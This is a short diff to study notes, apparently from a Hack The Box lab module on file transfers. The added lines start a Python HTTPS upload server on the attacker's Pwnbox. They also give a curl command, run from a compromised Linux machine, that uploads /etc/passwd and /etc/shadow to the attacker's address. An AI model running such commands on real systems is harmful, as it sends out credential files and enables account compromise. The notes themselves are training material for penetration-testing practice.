@@ -147,5 +147,14 @@ The webserver should not host the certificate. We recommend creating a new direc
 #### Pwnbox - Start Web Se
 ```shell
 mkdir https && cd https
-
+sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
 ```
+![](../../Attachements/Pasted%20image%2020260727120117.png)
+Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.
+
+#### Linux - Upload Multiple Files
+```shell
+Captainsparrow@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+```
+We used the option `--insecure` because we used a self-signed certificate that we trust.
+
